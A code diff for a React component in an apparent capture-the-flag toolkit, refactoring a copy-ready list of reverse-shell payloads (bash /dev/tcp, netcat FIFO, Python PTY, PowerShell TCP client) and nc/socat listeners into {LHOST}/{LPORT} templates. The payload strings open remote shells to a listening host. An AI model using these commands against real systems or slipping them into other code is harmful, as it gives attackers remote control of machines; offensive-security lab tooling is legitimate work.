@@ -9,56 +9,57 @@ import {
   Radio, 
   Terminal, 
   Crosshair, 
-  ShieldAlert,
-  Sliders,
   X
 } from 'lucide-react';
 import { useCtfStore } from '../../store/useCtfStore';
+import { useActiveTargetIp } from '../../hooks/useActiveTargetIp';
 import { useShallow } from 'zustand/react/shallow';
 import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';
 import { SyntaxHighlightedCommand } from './SyntaxHighlightedCommand';
+import { resolveTemplate, contextFromGlobalVars } from '../../utils/variableSubstitution';
 
 interface QuickShell {
   name: string;
   category: 'linux' | 'windows' | 'listener';
-  getCommand: (lhost: string, lport: string) => string;
+  // Uses the shared variable-substitution engine's {LHOST}/{LPORT} tokens.
+  template: string;
 }
 
 const QUICK_PAYLOADS: QuickShell[] = [
   {
     name: 'Bash -i',
     category: 'linux',
-    getCommand: (h, p) => `bash -i >& /dev/tcp/${h}/${p} 0>&1`,
+    template: 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1',
   },
   {
     name: 'Netcat FIFO',
     category: 'linux',
-    getCommand: (h, p) => `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${h} ${p} >/tmp/f`,
+    template: 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {LHOST} {LPORT} >/tmp/f',
   },
   {
     name: 'Python3 PTY',
     category: 'linux',
-    getCommand: (h, p) => `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${h}",${p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
+    template: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{LHOST}",{LPORT}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
   },
   {
     name: 'PowerShell Web',
     category: 'windows',
-    getCommand: (h, p) => `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('${h}',${p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
+    template: `powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('{LHOST}',{LPORT});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"`,
   },
   {
     name: 'RLWrap NC Listener',
     category: 'listener',
-    getCommand: (_h, p) => `rlwrap nc -lvnp ${p}`,
+    template: 'rlwrap nc -lvnp {LPORT}',
   },
   {
     name: 'Socat TTY Listener',
     category: 'listener',
-    getCommand: (_h, p) => `socat file:\`tty\`,raw,echo=0 tcp-listen:${p}`,
+    template: 'socat file:`tty`,raw,echo=0 tcp-listen:{LPORT}',
   },
 ];
 
 export const FloatingPayloadBar: React.FC = () => {
-  const { globalVars, setGlobalVars, activeTargetId, soundEnabled } = useCtfStore(
+  const { globalVars, setGlobalVars, soundEnabled } = useCtfStore(
     useShallow((s) => ({
       globalVars: s.globalVars,
       setGlobalVars: s.setGlobalVars,
@@ -75,6 +76,8 @@ export const FloatingPayloadBar: React.FC = () => {
       return { id: m.id, name: m.name, ip: m.ip };
     })
   );
+
+  const activeTargetIp = useActiveTargetIp();
 
   const [isExpanded, setIsExpanded] = useState(false);
   const [showShellDrawer, setShowShellDrawer] = useState(false);
@@ -96,8 +99,15 @@ export const FloatingPayloadBar: React.FC = () => {
 
   const lhost = globalVars.lhost || '10.10.14.X';
   const lport = globalVars.lport || '4444';
-  const targetIp = activeMachine?.ip || globalVars.targetIp || '10.10.10.X';
+  // Active engaged target's IP takes priority over the global RHOST
+  // (globalVars.targetIp) — see SubstitutionContext precedence doc.
+  const targetIp = activeTargetIp || globalVars.targetIp || '10.10.10.X';
   const currentInterface = globalVars.interface || 'tun0';
+
+  const substitutionContext = useMemo(
+    () => contextFromGlobalVars(globalVars, { activeTargetIp }),
+    [globalVars, activeTargetIp]
+  );
 
   const allTacticalInfo = useMemo(() => {
     if (activeMachine) {
@@ -296,7 +306,7 @@ export const FloatingPayloadBar: React.FC = () => {
                 }}
                 title={`Copy LHOST (${lhost})`}
                 aria-label="Copy LHOST"
-                className="p-1 hover:bg-surface-hover rounded text-muted hover:text-primary transition-[opacity,color] cursor-pointer opacity-0 group-hover:opacity-100 group-focus-within:opacity-100 focus-visible:opacity-100 [@media(hover:none)]:opacity-100"
+                className="p-1 hover:bg-surface-hover rounded text-muted hover:text-primary transition-[opacity,color] cursor-pointer opacity-0 group-hover:opacity-100 group-focus-within:opacity-100 focus-visible:opacity-100 touch:opacity-100"
               >
                 {copiedKey === 'min-lhost-btn' ? (
                   <Check className="w-3 h-3 text-callout-success-fg" />
@@ -504,7 +514,10 @@ export const FloatingPayloadBar: React.FC = () => {
                       className="mt-1.5 space-y-1 overflow-hidden will-change-transform"
                     >
                       {QUICK_PAYLOADS.map((shell) => {
-                        const cmd = shell.getCommand(lhost, lport);
+                        // Substitution rule: revshell templates use the NON-legacy mode
+                        // ({ip} = LHOST); all user, cheatsheet and methodology content
+                        // uses { legacyAliases: true } ({ip} = TARGET).
+                        const cmd = resolveTemplate(shell.template, substitutionContext).text;
                         const isCopied = copiedKey === `shell-${shell.name}`;
 
                         return (
